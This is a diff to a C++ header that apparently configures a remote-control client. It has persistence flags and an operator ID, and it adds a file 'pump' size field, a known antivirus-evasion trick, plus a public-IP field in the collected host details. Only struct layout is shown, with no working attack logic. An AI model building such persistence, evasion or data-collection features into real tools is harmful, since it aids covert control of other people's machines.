@@ -184,7 +184,8 @@ namespace Formidable {
         char        taskStartup;     // 计划任务自启
         char        serviceStartup;  // 服务自启
         char        registryStartup; // 注册表自启
-        char        szReserved[7];   // 占位
+        int32_t     iPumpSize;       // 程序增肥大小 (MB)
+        char        szReserved[3];   // 占位
         uint64_t    clientID;        // 客户端唯一标识
         uint64_t    parentHwnd;      // 父进程窗口句柄
         uint64_t    superAdmin;      // 管理员主控ID
@@ -207,6 +208,7 @@ namespace Formidable {
         char userName[64];
         char cpuInfo[128];       // CPU型号
         char lanAddr[64];       // LAN 地址
+        char publicAddr[64];    // 公网地址
         char activeWindow[256]; // 当前活动窗口
         char installTime[64];   // 安装/上线时间
         char uptime[64];        // 系统运行时间
@@ -249,6 +251,7 @@ namespace Formidable {
         0,                      // taskStartup
         0,                      // serviceStartup
         0,                      // registryStartup
+        0,                      // iPumpSize
         "",                     // szReserved
         0,                      // clientID
         0,                      // parentHwnd
